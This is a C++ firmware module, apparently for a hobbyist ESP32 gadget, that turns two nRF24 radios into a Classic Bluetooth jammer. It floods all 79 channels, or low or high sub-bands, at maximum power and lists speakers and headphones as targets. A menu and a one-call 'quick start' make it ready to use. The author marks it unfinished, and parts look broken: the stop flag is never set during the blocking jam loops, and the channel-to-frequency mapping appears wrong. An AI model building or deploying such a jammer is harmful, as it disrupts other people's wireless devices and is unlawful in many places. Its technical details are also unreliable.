////////this function is still in the dev process it is not 100% working






// ============================================================
//  CLASSIC BLUETOOTH JAMMER FOR HIZMOS
//  Uses 2 nRF24 modules (radio1 and radio2)
//  Jams all 79 Classic Bluetooth channels (2.402 - 2.480 GHz)
//  Targets: Bluetooth speakers, headphones, headsets
//  Complete single file - just add to your menu
// ============================================================

// ========== CLASSIC BLUETOOTH CHANNELS ==========
// Classic BT uses 79 channels (0-78) with 1MHz spacing
// Frequency = 2402 + channel (MHz)
const int BT_CLASSIC_CHANNELS[] = {
  0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19,
  20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37,
  38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55,
  56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73,
  74, 75, 76, 77, 78
};
const int NUM_BT_CLASSIC = 79;

// ========== JAMMING PARAMETERS ==========
#define BT_BURST_PER_CH 30        // Packets per channel (balanced)
#define BT_PACKET_SIZE 32
#define BT_CH_HOP_DELAY_MS 2      
#define DISPLAY_UPDATE_MS 300     

// ========== JAMMER STATE ==========
static bool btJammingActive = false;
static bool btStopRequested = false;
static uint32_t btTotalPackets = 0;
static uint32_t btStartTime = 0;
static uint32_t btLastDisplay = 0;
static int btCurrentChannel = 0;
static int btSelectedMode = 0;  // 0=full, 1=low, 2=high

// ========== PRE-ALLOCATED BUFFERS ==========
static uint8_t btNoiseData1[BT_PACKET_SIZE];
static uint8_t btNoiseData2[BT_PACKET_SIZE];
static bool btBuffersReady = false;

// ========== INITIALIZE JAMMING PATTERNS ==========
void initBtJammingBuffers() {
  if (btBuffersReady) return;
  
  // Create maximum interference patterns
  for (int i = 0; i < BT_PACKET_SIZE; i++) {
    btNoiseData1[i] = 0xFF;   // Full power noise
    btNoiseData2[i] = 0x00;   // Alternating pattern
  }
  
  // Add Bluetooth-specific patterns to confuse receivers
  btNoiseData1[0] = 0xAA;  // Access code pattern
  btNoiseData1[1] = 0x55;
  btNoiseData1[10] = 0xAA;
  btNoiseData1[11] = 0x55;
  
  btNoiseData2[0] = 0x55;
  btNoiseData2[1] = 0xAA;
  btNoiseData2[10] = 0xFF;
  btNoiseData2[11] = 0x00;
  
  btBuffersReady = true;
}

// ========== JAM SINGLE CHANNEL ==========
void IRAM_ATTR jamBtChannel(int channel, int burst) {
  // Set both radios to same channel
  radio1.setChannel(channel);
  radio2.setChannel(channel);
  
  // Transmit mode
  radio1.stopListening();
  radio2.stopListening();
  
  // Send burst
  for (int i = 0; i < burst; i++) {
    radio1.writeFast(btNoiseData1, BT_PACKET_SIZE);
    radio2.writeFast(btNoiseData2, BT_PACKET_SIZE);
    btTotalPackets += 2;
  }
}

// ========== JAM ALL CLASSIC BT CHANNELS ==========
void jamFullClassicBt() {
  btStartTime = millis();
  btTotalPackets = 0;
  
  while (!btStopRequested) {
    // Sweep through all 79 channels
    for (int i = 0; i < NUM_BT_CLASSIC && !btStopRequested; i++) {
      btCurrentChannel = BT_CLASSIC_CHANNELS[i];
      
      // Jam this channel
      jamBtChannel(btCurrentChannel, BT_BURST_PER_CH);
      
      // Update display periodically
      if (millis() - btLastDisplay > DISPLAY_UPDATE_MS) {
        drawBtJammerScreen();
        btLastDisplay = millis();
      }
    }
    delay(BT_CH_HOP_DELAY_MS);
  }
}

// ========== JAM LOW BAND (ch 0-39) ==========
void jamBtLowBand() {
  btStartTime = millis();
  btTotalPackets = 0;
  
  while (!btStopRequested) {
    for (int ch = 0; ch <= 39 && !btStopRequested; ch++) {
      btCurrentChannel = ch;
      jamBtChannel(ch, BT_BURST_PER_CH);
      
      if (millis() - btLastDisplay > DISPLAY_UPDATE_MS) {
        drawBtJammerScreen();
        btLastDisplay = millis();
      }
    }
    delay(BT_CH_HOP_DELAY_MS);
  }
}

// ========== JAM HIGH BAND (ch 40-78) ==========
void jamBtHighBand() {
  btStartTime = millis();
  btTotalPackets = 0;
  
  while (!btStopRequested) {
    for (int ch = 40; ch <= 78 && !btStopRequested; ch++) {
      btCurrentChannel = ch;
      jamBtChannel(ch, BT_BURST_PER_CH);
      
      if (millis() - btLastDisplay > DISPLAY_UPDATE_MS) {
        drawBtJammerScreen();
        btLastDisplay = millis();
      }
    }
    delay(BT_CH_HOP_DELAY_MS);
  }
}

// ========== DISPLAY JAMMING SCREEN ==========
void drawBtJammerScreen() {
  float freq = 2402.0 + btCurrentChannel;
  
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr);
  
  // Title
  u8g2.drawStr(0, 8, "CLASSIC BT JAMMER");
  u8g2.drawHLine(0, 10, 128);
  
  // Mode display
  const char* modeText = "";
  switch(btSelectedMode) {
    case 0: modeText = "Full Spectrum (79ch)"; break;
    case 1: modeText = "Low Band (ch 0-39)"; break;
    case 2: modeText = "High Band (ch 40-78)"; break;
  }
  u8g2.drawStr(0, 22, modeText);
  
  // Channel and frequency
  char chStr[20];
  snprintf(chStr, sizeof(chStr), "Ch:%d / 78", btCurrentChannel);
  u8g2.drawStr(0, 34, chStr);
  
  char freqStr[20];
  snprintf(freqStr, sizeof(freqStr), "%.0f MHz", freq);
  u8g2.drawStr(70, 34, freqStr);
  
  // Packet counter (formatted)
  char pktStr[20];
  if (btTotalPackets > 1000000) {
    snprintf(pktStr, sizeof(pktStr), "Pkt:%.1fM", btTotalPackets / 1000000.0);
  } else if (btTotalPackets > 1000) {
    snprintf(pktStr, sizeof(pktStr), "Pkt:%luK", btTotalPackets / 1000);
  } else {
    snprintf(pktStr, sizeof(pktStr), "Pkt:%lu", btTotalPackets);
  }
  u8g2.drawStr(0, 46, pktStr);
  
  // Runtime
  uint32_t runtime = (millis() - btStartTime) / 1000;
  char timeStr[20];
  snprintf(timeStr, sizeof(timeStr), "Time:%lu s", runtime);
  u8g2.drawStr(0, 58, timeStr);
  
  // Dual nRF indicator
  u8g2.drawStr(85, 58, "2xNRF");
  
  // Progress bar
  int maxCh = (btSelectedMode == 0) ? 78 : 
              (btSelectedMode == 1) ? 39 : 78;
  int startCh = (btSelectedMode == 2) ? 40 : 0;
  int progress = ((btCurrentChannel - startCh) * 68) / (maxCh - startCh + 1);
  if (progress < 0) progress = 0;
  if (progress > 68) progress = 68;
  
  u8g2.drawFrame(50, 46, 68, 5);
  if (progress > 0) u8g2.drawBox(51, 47, progress, 3);
  
  // BACK button hint
  u8g2.drawStr(0, 70, "[BACK] Stop");
  
  u8g2.sendBuffer();
}

// ========== MENU SCREEN ==========
void drawBtJammerMenu() {
  const char* modes[] = {
    "Full Spectrum (79ch)",
    "Low Band (ch 0-39)",
    "High Band (ch 40-78)"
  };
  const int numModes = 3;
  static unsigned long lastInput = 0;
  
  if (millis() - lastInput > 150) {
    if (digitalRead(BTN_UP) == LOW) {
      btSelectedMode = (btSelectedMode - 1 + numModes) % numModes;
      lastInput = millis();
    }
    
    if (digitalRead(BTN_DOWN) == LOW) {
      btSelectedMode = (btSelectedMode + 1) % numModes;
      lastInput = millis();
    }
    
    if (digitalRead(BTN_BACK) == LOW) {
      btJammingActive = false;
      return;
    }
    
    if (digitalRead(BTN_SELECT) == LOW) {
      // Configure radios for maximum jamming power
      radio1.setPALevel(RF24_PA_MAX);
      radio1.setDataRate(RF24_2MBPS);
      radio1.setAutoAck(false);
      radio1.setCRCLength(RF24_CRC_DISABLED);
      
      radio2.setPALevel(RF24_PA_MAX);
      radio2.setDataRate(RF24_2MBPS);
      radio2.setAutoAck(false);
      radio2.setCRCLength(RF24_CRC_DISABLED);
      
      // Initialize jamming buffers
      initBtJammingBuffers();
      
      // Reset state
      btStopRequested = false;
      btJammingActive = true;
      btLastDisplay = 0;
      
      // Start selected mode
      switch(btSelectedMode) {
        case 0: jamFullClassicBt(); break;
        case 1: jamBtLowBand(); break;
        case 2: jamBtHighBand(); break;
      }
      
      btJammingActive = false;
      lastInput = millis();
      return;
    }
  }
  
  // Draw menu
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_7x14_tf);
  u8g2.drawStr(10, 20, "CLASSIC BT");
  u8g2.setFont(u8g2_font_5x8_tr);
  
  for (int i = 0; i < numModes; i++) {
    int y = 40 + (i * 12);
    if (i == btSelectedMode) {
      u8g2.drawStr(5, y, ">");
      u8g2.drawStr(15, y, modes[i]);
    } else {
      u8g2.drawStr(15, y, modes[i]);
    }
  }
  
  u8g2.drawStr(5, 60, "79ch | 2.402-2.480GHz");
  u8g2.drawStr(5, 68, "Targets: Speakers/Headphones");
  u8g2.drawStr(5, 76, "[BACK] Exit  [SEL] Start");
  u8g2.sendBuffer();
}

// ========== MAIN FUNCTION - CALL THIS FROM YOUR MENU ==========
void classicBtJammer() {
  btJammingActive = false;
  btStopRequested = false;
  
  // Show menu and handle jamming
  while (true) {
    drawBtJammerMenu();
    
    // Check if we need to exit (BACK button exits menu)
    if (digitalRead(BTN_BACK) == LOW && !btJammingActive) {
      delay(200);
      return;
    }
    
    delay(50);
  }
}

// ========== QUICK START (NO MENU, JUST JAM) ==========
void quickBtJam() {
  // Configure radios
  radio1.setPALevel(RF24_PA_MAX);
  radio1.setDataRate(RF24_2MBPS);
  radio1.setAutoAck(false);
  radio1.setCRCLength(RF24_CRC_DISABLED);
  
  radio2.setPALevel(RF24_PA_MAX);
  radio2.setDataRate(RF24_2MBPS);
  radio2.setAutoAck(false);
  radio2.setCRCLength(RF24_CRC_DISABLED);
  
  initBtJammingBuffers();
  
  btStopRequested = false;
  btSelectedMode = 0;
  
  // Show start screen
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.drawStr(20, 32, "CLASSIC BT JAMMER");
  u8g2.drawStr(10, 48, "Jamming 2.4GHz spectrum");
  u8g2.drawStr(15, 64, "Press BACK to stop");
  u8g2.sendBuffer();
  delay(1000);
  
  // Start jamming
  jamFullClassicBt();
}